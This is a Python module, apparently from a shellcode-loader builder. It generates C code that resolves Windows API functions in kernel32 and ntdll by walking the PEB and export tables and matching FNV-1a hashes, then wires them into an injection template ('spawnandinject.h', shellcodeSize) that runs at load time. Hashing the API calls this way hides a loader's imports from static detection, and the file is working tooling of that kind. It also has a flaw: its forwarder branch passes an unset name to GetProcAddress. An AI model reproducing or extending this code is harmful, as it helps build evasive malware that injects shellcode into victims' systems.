import random
import string
from c.utils.typedefs import typedefs

class pebwalkhash:
    def __init__(self, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        self.handle = 'LoadLibrary'
        if 'handle' in arguments:
            if arguments['handle'] in ['LoadLibrary', 'GetModuleHandleA']:
                self.handle = arguments['handle']
            else:
                print("Handle must be either LoadLibrary or GetModuleHandleA")
                exit(0)
        self.typedefs = typedefs
        self.apicalls = {}

    def imports(self) -> list[str]:
        return ['#include <windows.h>',
                '#include "spawnandinject.h"']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        kernel32 = []
        ntdll = []
        codeblock = ''
        for apicall in self.apicalls:
            if apicall[0:2] in ['Nt', 'Zw', 'Rt']:
                ntdll.append(apicall)
            else:
                kernel32.append(apicall)

        codeblock += """

DWORD HashString(LPVOID String, BOOL IsWide)
{
    DWORD hash = 0x811C9DC5;
    PUCHAR Ptr = String;
    do
    {
        UCHAR character = *Ptr;
        if (!*Ptr && !IsWide)
            break;

        hash = ((hash ^ character) * 0x01000193) & 0xffffffff;

        // Use Ptr+1 to peek instead of ++Ptr which advances the pointer
        if (IsWide && (!*Ptr && !*(Ptr + 1)))
            break;

        ++Ptr;
    } while (TRUE);

    return hash;
}

PVOID LoadModulePeb( UINT_PTR hModuleHash )
{

    PPEB PPEB_PTR = (PPEB)__readgsqword( 0x60 );
    PLIST_ENTRY Module      = ( ( PPEB ) PPEB_PTR )->Ldr->InLoadOrderModuleList.Flink; 
    PLIST_ENTRY FirstModule = Module;

    WCHAR  SearchModuleLower[ MAX_PATH ]  = { 0 };
    WCHAR  PebModuleLower   [ MAX_PATH ]  = { 0 };

    do
    {
        // Zero a buffer and lowercase the found module name
        PLDR_DATA_TABLE_ENTRY mod = (PLDR_DATA_TABLE_ENTRY)CONTAINING_RECORD(
            Module, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks
        );
        wprintf(L"%ls\\n", mod->BaseDllName.Buffer);
        printf("%llu\\n", HashString(mod->BaseDllName.Buffer, TRUE));
        DWORD ModuleHash = HashString(mod->BaseDllName.Buffer, TRUE);

        // If the lowercased strings match, return the address of the DLL
        if ( ModuleHash == hModuleHash ){
            return mod->DllBase;
        }
        Module = Module->Flink;
    } while ( Module && Module != FirstModule );

    return 0;
}


PVOID LoadFunction( PBYTE Module, UINT_PTR FunctionHash )
{
    PIMAGE_NT_HEADERS       NtHeader         = NULL;
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = NULL;
    PDWORD                  AddrOfFunctions  = NULL;
    PDWORD                  AddrOfNames      = NULL;
    PWORD                   AddrOfOrdinals   = NULL;
    PVOID                   FunctionAddr     = NULL;
    LPSTR                   FoundName        = NULL;
    PCHAR FunctionName = NULL;

    NtHeader         = (PIMAGE_NT_HEADERS)(Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew);
    ExpDirectory     = (PIMAGE_EXPORT_DIRECTORY)(Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress);
    
    // Resolve absolute address of important export directory members
    AddrOfNames      = (PDWORD)(Module + ExpDirectory->AddressOfNames);
    AddrOfFunctions  = (PDWORD)(Module + ExpDirectory->AddressOfFunctions);
    AddrOfOrdinals   = (PWORD)(Module + ExpDirectory->AddressOfNameOrdinals);

    // Walk through the number of names
    for ( DWORD I = 0; I < ExpDirectory->NumberOfNames; I++ )
    {
        // Zero a buffer to contain the found function, lowercased
        FunctionName = ( PCHAR ) Module + AddrOfNames[ I ];

        // Check if the lowercased strings match
        if ( HashString( FunctionName, FALSE ) == FunctionHash )
        {
            // If they match, resolve the address of the function's code
            FunctionAddr = Module + AddrOfFunctions[ AddrOfOrdinals[ I ] ];

            if ( 
                (void *)FunctionAddr > (void *)(Module + NtHeader->OptionalHeader.DataDirectory[ 0 ].VirtualAddress) && 
                (void *)FunctionAddr < (void *)(Module + NtHeader->OptionalHeader.DataDirectory[ 0 ].VirtualAddress + NtHeader->OptionalHeader.DataDirectory[ 0 ].Size)
            ) // Forwarders are inside export table
            {
                // We can use getProcAddr to resolve forwarders
                // Manually is difficult -- we may run into apisets rather than simple [module].[export] strings
                return GetProcAddress( (HMODULE)Module, FoundName );
            }
            return FunctionAddr;
        }
    }
    return NULL;
}
"""

        codeblock += f"""

{'\n'.join([value for key,value in self.typedefs.items() if key in self.apicalls ])}

typedef struct {{
    {'\n\t'.join([f'{x}_t {x}_resolved;' for x in self.apicalls ])}
}} Resolver;

Resolver resolver;

NTSTATUS status;

void {self.name}(void) __attribute__((constructor));

void {self.name}(){{
"""
        if len(kernel32) > 0:
            codeblock += f"""
    PVOID kernelHandle = LoadModulePeb({self.hash_string('KERNEL32.DLL')});
    {'\n\t'.join([f'resolver.{x}_resolved = ({x}_t)LoadFunction(kernelHandle, {self.hash_string(x, False)});' for x in kernel32])};
"""

        if len(ntdll) > 0:
            codeblock += f"""
    PVOID ntdllHandle = LoadModulePeb({self.hash_string('ntdll.dll')});
    {'\n\t'.join([f'resolver.{x}_resolved = ({x}_t)LoadFunction(ntdllHandle, {self.hash_string(x, False)});' for x in ntdll])};
"""

        codeblock += f"""
}}
"""
        return codeblock

    def template(self, templateCode, transformers, shellcodeSize):
        for _, field_name, _, _ in string.Formatter().parse(templateCode):
            if field_name is not None and field_name not in ['shellcodeSize', 'transformers']:
                self.apicalls[field_name] = ''
        self.resolve()
        return templateCode.format(transformers=transformers, shellcodeSize=shellcodeSize, **self.apicalls)

    def resolve(self):
        for apicall in self.apicalls:
            if apicall[0:2] == 'Nt':
                self.apicalls[apicall] = f'status = resolver.{apicall}_resolved'
            else:
                self.apicalls[apicall] = f'resolver.{apicall}_resolved'

    def hash_string(self, functionName: str, is_wide: bool = True) -> int:
        hash = 0x811C9DC5

        if is_wide:
            # Encode as UTF-16LE to replicate the raw byte layout C sees
            data = functionName.encode('utf-16-le')
        else:
            data = functionName.encode('ascii')

        for byte in data:
            hash = ((hash ^ byte) * 0x01000193) & 0xFFFFFFFF

        print(f"{functionName}: {hash}")
        return hash